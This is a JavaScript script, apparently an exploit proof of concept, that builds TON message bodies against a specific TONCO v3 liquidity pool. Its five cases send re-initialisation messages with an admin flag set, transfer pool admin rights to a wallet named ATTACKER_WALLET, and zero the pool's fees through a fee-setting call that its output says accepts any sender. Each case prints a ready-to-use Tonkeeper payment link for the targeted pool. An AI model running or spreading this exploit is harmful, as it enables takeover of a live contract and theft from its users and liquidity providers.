const { beginCell, Address, toNano } = require('@ton/core');

const POOLV3_INIT = 0x441c39ed;
const POOLV3_SET_FEE = 0x6bdcbeb8;
const IMPOSSIBLE_FEE = 10001; // FEE_DENOMINATOR + 1 из SDK

const NEW_POOL = 'EQBTVxBp0SNUtghiT6sncaP-FgD2omffgwexK0jK9MZErZQ7';
const ADMIN_WALLET = 'UQCvPAknwpT9a9dSCCtF_RdRh2bssBmuOBNG0hamNL5EuLpT';
const ATTACKER_WALLET = 'UQCRcaW_DHaJaTJ1-bhWnElHap2xeOCYVEDKoRWyXSrUatTC';

// jetton minter адреса из данных пула
const JETTON0_MINTER = Address.parse('EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs'); // USDT minter
const JETTON1_MINTER = Address.parse('EQAWpz2_G0NKxlG2VvgFbgZGPt8Y1qe0cGj-4Yw5BfmYR5iF'); // pTON minter

// Minter cell совпадает с тем что в роутере
const minterCell = beginCell()
    .storeAddress(JETTON0_MINTER)
    .storeAddress(JETTON1_MINTER)
    .endCell();

console.log('=== АТАКА: POOLV3_INIT с is_from_admin=1 ===');
console.log('Используем точную структуру из SDK TONCO');
console.log('');

const nftContentPacked = beginCell().storeUint(0, 1).endCell(); // пустой maybe ref

// ========== TEST 1: Только is_from_admin=1, ничего не меняем ==========
console.log('--- TEST 1: Minimal reinit с is_from_admin=1 ---');
console.log('is_from_admin=1, все остальные поля undefined/0');
console.log('');

// Это то же самое, что reinitMessage({ is_from_admin: true })
const body1 = beginCell()
    .storeUint(POOLV3_INIT, 32)        // op
    .storeUint(0, 64)                  // query_id
    .storeUint(1, 1)                   // is_from_admin = 1
    .storeUint(0, 1)                   // has_admin = false
    .storeUint(0, 1)                   // has_controller = false
    .storeUint(0, 1)                   // has_tickSpacing = false
    .storeUint(0, 1)                   // has_sqrtPriceX96 = false
    .storeUint(0, 1)                   // has_activate_pool = false
    .storeUint(IMPOSSIBLE_FEE, 16)    // protocolFee = IMPOSSIBLE_FEE (не менять)
    .storeUint(IMPOSSIBLE_FEE, 16)    // lpFee = IMPOSSIBLE_FEE (не менять)
    .storeUint(IMPOSSIBLE_FEE, 16)    // currentFee = IMPOSSIBLE_FEE (не менять)
    .storeRef(beginCell().endCell())   // nftContentPacked = пустой
    .storeRef(beginCell().endCell())   // nftItemContentPacked = пустой
    .storeMaybeRef(null)               // minterCell = null (нет)
    .endCell();

const boc1 = body1.toBoc().toString('base64');
console.log('Body BoC:', boc1);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc1));
console.log('');

// ========== TEST 2: is_from_admin=1 + admin = attacker wallet ==========
console.log('--- TEST 2: Reinit с admin = attacker ---');
console.log('is_from_admin=1, admin = второй кошелек');
console.log('');

const body2 = beginCell()
    .storeUint(POOLV3_INIT, 32)        // op
    .storeUint(0, 64)                  // query_id
    .storeUint(1, 1)                   // is_from_admin = 1
    .storeUint(1, 1)                   // has_admin = true
    .storeAddress(Address.parse(ATTACKER_WALLET))  // admin = attacker
    .storeUint(0, 1)                   // has_controller = false
    .storeUint(0, 1)                   // has_tickSpacing = false
    .storeUint(0, 1)                   // has_sqrtPriceX96 = false
    .storeUint(0, 1)                   // has_activate_pool = false
    .storeUint(IMPOSSIBLE_FEE, 16)    // protocolFee = IMPOSSIBLE_FEE
    .storeUint(IMPOSSIBLE_FEE, 16)    // lpFee = IMPOSSIBLE_FEE
    .storeUint(IMPOSSIBLE_FEE, 16)    // currentFee = IMPOSSIBLE_FEE
    .storeRef(beginCell().endCell())   // nftContentPacked = пустой
    .storeRef(beginCell().endCell())   // nftItemContentPacked = пустой
    .storeMaybeRef(null)               // minterCell = null
    .endCell();

const boc2 = body2.toBoc().toString('base64');
console.log('Body BoC:', boc2);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc2));
console.log('');

// ========== TEST 3: is_from_admin=1 + SET_FEES ==========
console.log('--- TEST 3: SET_FEES с любого кошелька ---');
console.log('Меняем комиссии (мы уже знаем что это работает)');
console.log('');

const body3 = beginCell()
    .storeUint(POOLV3_SET_FEE, 32)     // op
    .storeUint(0, 64)                  // query_id
    .storeUint(0, 16)                  // protocolFee = 0
    .storeUint(0, 16)                  // lpFee = 0
    .storeUint(0, 16)                  // currentFee = 0
    .endCell();

const boc3 = body3.toBoc().toString('base64');
console.log('Body BoC:', boc3);
console.log('Tonkeeper link (ЛЮБОЙ кошелек - не проверяет admin):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.1').toString() + '&bin=' + encodeURIComponent(boc3));
console.log('');

// ========== TEST 4: POOLV3_INIT с minterCell (как в роутере) ==========
console.log('--- TEST 4: POOLV3_INIT с minterCell (как при создании через роутер) ---');
console.log('is_from_admin=1, admin = admin_wallet, fees = 0, с minterCell');
console.log('');

const body4 = beginCell()
    .storeUint(POOLV3_INIT, 32)        // op
    .storeUint(0, 64)                  // query_id
    .storeUint(1, 1)                   // is_from_admin = 1
    .storeUint(0, 1)                   // has_admin = false
    .storeUint(0, 1)                   // has_controller = false
    .storeUint(0, 1)                   // has_tickSpacing = false
    .storeUint(0, 1)                   // has_sqrtPriceX96 = false
    .storeUint(0, 1)                   // has_activate_pool = false
    .storeUint(0, 16)                  // protocolFee = 0
    .storeUint(0, 16)                  // lpFee = 0
    .storeUint(0, 16)                  // currentFee = 0
    .storeRef(beginCell().endCell())   // nftContentPacked = пустой
    .storeRef(beginCell().endCell())   // nftItemContentPacked = пустой
    .storeMaybeRef(minterCell)         // minterCell с адресами minter'ов
    .endCell();

const boc4 = body4.toBoc().toString('base64');
console.log('Body BoC:', boc4);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc4));
console.log('');

// ========== TEST 5: POOLV3_INIT с minterCell + admin = attacker ==========
console.log('--- TEST 5: Максимальная атака - admin = attacker + minterCell ---');
console.log('');

const body5 = beginCell()
    .storeUint(POOLV3_INIT, 32)        // op
    .storeUint(0, 64)                  // query_id
    .storeUint(1, 1)                   // is_from_admin = 1
    .storeUint(1, 1)                   // has_admin = true
    .storeAddress(Address.parse(ATTACKER_WALLET))  // admin = attacker
    .storeUint(0, 1)                   // has_controller = false
    .storeUint(0, 1)                   // has_tickSpacing = false
    .storeUint(0, 1)                   // has_sqrtPriceX96 = false
    .storeUint(0, 1)                   // has_activate_pool = false
    .storeUint(0, 16)                  // protocolFee = 0
    .storeUint(0, 16)                  // lpFee = 0
    .storeUint(0, 16)                  // currentFee = 0
    .storeRef(beginCell().endCell())   // nftContentPacked = пустой
    .storeRef(beginCell().endCell())   // nftItemContentPacked = пустой
    .storeMaybeRef(minterCell)         // minterCell с адресами minter'ов
    .endCell();

const boc5 = body5.toBoc().toString('base64');
console.log('Body BoC:', boc5);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc5));
